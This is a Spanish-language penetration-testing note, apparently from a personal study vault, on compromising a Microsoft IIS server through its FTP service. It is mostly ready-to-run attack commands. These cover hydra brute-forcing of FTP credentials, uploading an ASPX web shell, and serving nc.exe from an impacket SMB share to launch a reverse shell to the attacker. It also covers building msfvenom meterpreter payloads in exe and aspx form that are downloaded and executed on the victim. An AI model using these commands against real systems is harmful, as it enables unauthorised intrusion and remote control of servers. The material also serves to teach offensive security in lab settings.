
---

Esta vulnerabilidad radica en el servicio habilitado de IIS (Internet Información Services) mediante un sitio web, al ejecutar un escaneo, esto nos tendria que aparecer:

![[Pasted image 20251021155536.png]]

*En donde esta abierto el protocolo 21 que a menudo se asocia con IIS y esta abierto el protocolo http del puerto 80 con el servicio de Microsoft IIS*

- Para esto podemos ejecutar primeramente un ataque de fuerza bruta para el puerto [[p21 - FTP (File Transfer Protocol)]] de la siguiente manera

```bash
hydra -L /usr/share/wordlist/seclist/usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlist/seclist/passwords/xato-net-10-million-passwords-100000.txt ftp://192.168.1.20  # Esto en caso de no saber ni usuario ni contraseña
```

*procedemos a entrar con las credenciales al protocolo ftp*

- Una ves ingresando podremos ver los archivos de gestión de la pagina web como el index y otros recursos, Para poder realizar una ejecución remota de comandos podemos subir una shell de la siguiente manera:

```bash
find / -name cmdasp.aspx 2>/dev/null   # Buscamos la shell .aspx en nuestra maquina atacante 
cp /usr/share/webshells/aspx/cmdasp.aspx . # Copiamos la web shell a nuestro directorio actual de trabajo en nuestra maquina atacante
ftp >
	put cmdasp.aspx  # Dentro de la consola ftp , colocamos la web shell y ya podriamos acceder por la pagina web 
```

###### Si no llega a estar la web Shell en nuestra maquina atacante la podríamos crear con [[1. MsfVenom]] 

- Este seria el apartado de creación de la web shell :
-
![[Pasted image 20251021160849.png]]


*Obtener la Reverse Shell mediante Recursos compartidos*

```bash
find / -name nc.exe 2>/dev/null  # Buscamos la shell que queremos en nuestra maquina atacante, este caso es la de binarios 
cp /usr/share/windows-resources/binaries/nc.exe . # Copiamos el codigo malicioso a nuestro directorio
impacket-smbserver recurso $(pwd) -smb2support # Levantamos el servidor de recurso compartido

nc -nlvp 443 # En otra ventana nos ponemos en escuha
```

- En la web shell de la maquina victima procedemos a ejecutar lo siguiente:

```bash
\\<IpAtacante>\recurso\nc.exe -e cmd.exe <IpAtacante> 443  # Nos mandariamos una reverse shell a nuestra sesion de escucha 
```

--- 
#### Cambio a una sesión Meterpreter

- En nuestra maquina Atacante procedemos a crear el payload que establecera una sesión de meterpreter, con el siguiente comando:
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IpAtacante> LPORT=444 -f exe -o shell.exe
```

- Con el payload ya creado, podemos descargarlo desde la maquina victima con Curl o con Wget , si no estan instalados procederemos a levantarnos otra ves un servidor de recursos compartidos de la siguiente manera:

```bash
impacket-smbserver recurso $(pwd) -smb2support
```

- Con el servidor ya lanzado, tendríamos que ponernos en una ruta de escritura en la maquina victima de la siguiente manera:

*Recordar ponerse en escucha con [[Metasploit]] en el modulo /multi/handler por la maquina Atacante , seteando ip, puerto y el mismo PAYLOAD de la shell de msfvenom*
```bash 
cd /temp  # Nos movemos hasta ir al directorio temp
copy \\<IpAtacante>\recurso\shell.exe shell.exe  # Nos descargamos la shell.exe en la maquina victima
shell.exe   # Ejecutamos la shell
```


---

# Forma de Explotación 2 

- Creamos la shell con msfvenom y la subimos por ftp de la siguiente manera

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.223.174 LPORT=4444 -f aspx -o shell.aspx  # Extension de archivo aspx 
ftp <Ipvictima>  # Iniciamos sesion por ftp , el Usuario que pediran lo normal es que sea anonymous y la contraseña vacia (ENTER)
ftp > 
	put shell.aspx # Subimos la shell a los archivos del sitio web
	
# Despues solo llendo a la url donde esta la shell se activira y nos dara la conexion multi handler  "http://192.168.0.1/shell.aspx"
# Recordar Estar en escucha con el modulo /multi/handler de metaesploit y setear los mismos parametros de payload , lhost y lport 
```
